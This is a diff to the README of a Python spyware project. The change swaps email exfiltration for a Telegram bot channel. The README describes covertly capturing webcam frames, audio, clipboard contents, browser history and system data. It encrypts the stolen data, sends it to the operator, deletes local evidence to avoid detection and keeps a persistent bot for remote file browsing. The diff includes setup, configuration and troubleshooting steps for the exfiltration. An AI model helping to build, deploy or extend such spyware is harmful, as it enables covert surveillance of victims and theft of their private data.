@@ -53,10 +53,11 @@ Collects comprehensive system data including:
 - Uses a pre-shared encryption key
 - Provides confidentiality during data transmission
 
-### 7. **Email Exfiltration**
-- Compresses and sends all collected data to the attacker's email
-- Separates audio files into individual emails
-- Includes metadata about the compromised system
+### 7. **Telegram Exfiltration**
+- Sends collected data through Telegram bot API
+- Encrypts sensitive data before transmission
+- Provides real-time updates via chat messages
+- Supports file attachments and formatted messages
 
 ### 8. **Evidence Cleanup**
 - Deletes all local log files after exfiltration
@@ -93,9 +94,10 @@ spyware/
 3. Launch 4 parallel processes for intensive data capture
 4. Wait for all processes to complete (5-minute timeout)
 5. Encrypt collected files using Fernet encryption
-6. Send encrypted data via email (Gmail SMTP)
-7. Delete local evidence
-8. Restart the loop
+6. Send data through Telegram bot API
+7. Cleanup local evidence
+8. Maintain persistent Telegram bot connection
+9. Restart the loop
 
 ---
 
@@ -120,8 +122,8 @@ pip install -r requirements.txt
 
 3. **Configure Email Credentials** (in `spyware.py`)
 ```python
-email_address = 'your-email@gmail.com'  # Change this
-password = 'your-app-password'          # Use Google App Password
+BOT_TOKEN = 'your-telegram-bot-token'  # Change this
+CHAT_ID = 'your-chat-id'               # Telegram chat ID
 ```
 
 4. **Generate Encryption Key** (optional - to create a new key)
@@ -159,11 +161,11 @@ python spyware.py
 - Captures video frames as JPEG images
 - Validates camera accessibility before recording
 
-### `send_email(path)`
-- Parses collected files by type (TXT, XML, PNG, JPG, WAV)
-- Attaches files to email using MIME encoding
-- Base64 encodes attachments
-- Sends via Gmail SMTP server
+### Telegram Integration
+- Uses `python-telegram-bot` for asynchronous communication
+- Implements directory navigation bot with /list, /cd, /zip commands
+- Encrypts sensitive data before transmission
+- Supports real-time file exfiltration via chat
 
 ---
 
@@ -204,6 +206,7 @@ python spyware.py
 | requests | 2.31.0+ | HTTP requests for public IP |
 | browserhistory | 0.1.2+ | Browser history extraction |
 | pywin32 | 305+ | Windows API access (clipboard) |
+| python-telegram-bot | 20.0+ | Telegram bot integration |
 | numpy | 1.24.0+ | Numeric operations for audio |
 
 ---
@@ -232,11 +235,12 @@ python spyware.py
 ### Issue: "Webcam not working"
 **Solution:** Check if another application is using the camera, or grant permissions in Windows Settings.
 
-### Issue: "Email not sending"
-**Solution:** 
-- Use Gmail App Password (not regular password)
-- Enable "Less secure app access" if using regular Gmail
-- Check firewall isn't blocking SMTP port 587
+### Issue: "Telegram bot not responding"
+**Solution:**
+- Verify BOT_TOKEN and CHAT_ID are correct
+- Ensure internet connectivity
+- Check Telegram API status
+- Confirm bot has message sending permissions
 
 ### Issue: "Audio recording fails"
 **Solution:** Verify microphone is working in Windows Sound settings and not muted.
